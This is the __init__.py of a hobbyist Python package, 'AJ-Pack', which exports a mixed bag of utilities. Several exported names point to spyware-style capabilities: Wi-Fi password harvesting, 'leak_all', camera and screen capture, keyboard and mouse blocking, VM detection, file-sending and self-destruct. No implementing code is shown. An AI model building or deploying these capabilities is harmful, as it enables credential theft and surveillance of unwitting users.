"""
# AJ-Pack
This is my little module for python.\n
Just enjoy it and don't do something illegal ;) have fun <3\n
Check me out on [github](https://github.com/AJ-Holzer)!\n
If you have any questions, just join the [discord channel](https://discord.gg/HvwFgC54UJ).
"""


#####################################################
##                                                 ##
##    We all know, that this code is messed up.    ##
##    So, just ignore that...                      ##
##                                                 ##
##    (•_•)                                        ##
##                                                 ##
#####################################################


'CTk'
from .ctk.ctk import center_ctk
from .ctk.questions import yes_no_window
'Destroy'
from .destroy.reg import reg2_0
'Folder'
from .folder.env import create_env, create_standard_env
'Hack'
from .hack.keyboard import block_keyboard, keyboard_type
from .hack.mouse import block_mouse
'OS'
from .os.get_drives import drives
from .os.processes import list_processes
from .os.kill import kill_process
from .os.ressources import get_system_resources
from .os.disk import get_disk_info
from .os.batt import get_battery_status
from .os.base_path import get_base_path
from .os.folders import get_paths, parent_folder
from .os.win import get_terminal_output
from .os.network import get_local_ip
'Checks'
from .checks.internet import has_internet, ping, check_open_port
from .checks.vm import run_on_vm
'PWD'
from .pwd.pwds import gen_pwd
'Zip'
from .zip.zipping import create_zip
'Data'
from .data.get_data import take_image, capture, get_wifi_pwds, leak_all
'Send'
from .send.send_data import send_file, send_embed
from .send.email import send_email
'Useful'
from .useful.convert import remove_duplicates, str_to_dict
from .useful.wait import waiter
from .useful.shortcut import create_shortcut
from .useful.notifications import desktop_msg
from .useful.format import table
from .useful.stripping import rma_str
from .useful.music import play_music
'Terminal'
from .terminal.apps import wait, size_calc, cls, colored_text, formatted_text, get_sys_info, err, suc, war, deb, inf
from .terminal.logging import Logger
from .terminal.print import printl, printst, printet_ok, printet_err
from .terminal.commands import Terminal
'Test'
from .test.test import simple_test
'AES'
from .aes.aes256 import decrypt_aes256, encrypt_aes256
'Time'
from .time.convert_time import conv_sec
'Hash'
from .hash.hash import hash_file, hash_string
from .hash.etag import get_file_etag, get_str_etag, get_bytes_etag
'RSA'
from .rsa.rsa import gen_private_key, gen_public_key, encrypt_rsa, decrypt_rsa
'Hardware'
from .hardware.gpu import run_on_gpu
'Socket'
from .socket.connection import send, send_rsa, rcv, rcv_rsa
'Fun'
from .fun.destruct import self_destruct
from .fun.jokes import joke


# Package metadata
__all__: list[str] = [
    "reg2_0",
    "create_env",
    "block_keyboard",
    "block_mouse",
    "drives", 
    "has_internet",
    "run_on_vm",
    "gen_pwd",
    "create_zip",
    "take_image",
    "capture",
    "get_wifi_pwds",
    "leak_all",
    "send_file",
    "send_embed",
    "remove_duplicates",
    "wait",
    "size_calc",
    "cls",
    "colored_text",
    "formatted_text",
    "get_sys_info",
    "ping",
    "list_processes",
    "kill_process",
    "check_open_port",
    "get_system_resources",
    "get_disk_info",
    "get_battery_status",
    "create_standard_env",
    "waiter",
    "create_shortcut",
    "desktop_msg",
    "get_base_path",
    "center_ctk",
    "simple_test",
    "yes_no_window",
    "table",
    "rma_str",
    "get_paths",
    "err",
    "suc",
    "war",
    "deb",
    "inf",
    "parent_folder",
    "send_email",
    "play_music",
    "decrypt_aes256",
    "encrypt_aes256",
    "str_to_dict",
    "conv_sec",
    "hash_file",
    "hash_string",
    "Logger",
    "printl",
    "printst",
    "printet_ok",
    "printet_err",
    "get_terminal_output",
    "keyboard_type",
    "get_local_ip",
    "Terminal",
    "gen_private_key",
    "gen_public_key",
    "encrypt_rsa",
    "decrypt_rsa",
    "run_on_gpu",
    "send",
    "send_rsa",
    "rcv",
    "rcv_rsa",
    "self_destruct",
    "joke",
    "get_file_etag",
    "get_str_etag",
    "get_bytes_etag",
]

__author__ = "AJ-Holzer"
__status__ = "Development"
__license__ = "MIT"
__description__ = "This is a module which allows you to modify a pc or doing just some little things."
__url__ = "https://github.com/AJ-Holzer/AJ-Module"

def start_msg():
    # Run this code before the module starts
    from .settings import settings

    # Initialization code
    if settings.send_init_msg:
        msg = settings.GREEN + settings.ITALIC + f"--> Package '{__name__}' initialized...\n" + settings.RESET + settings.WHITE
        print(msg)

start_msg()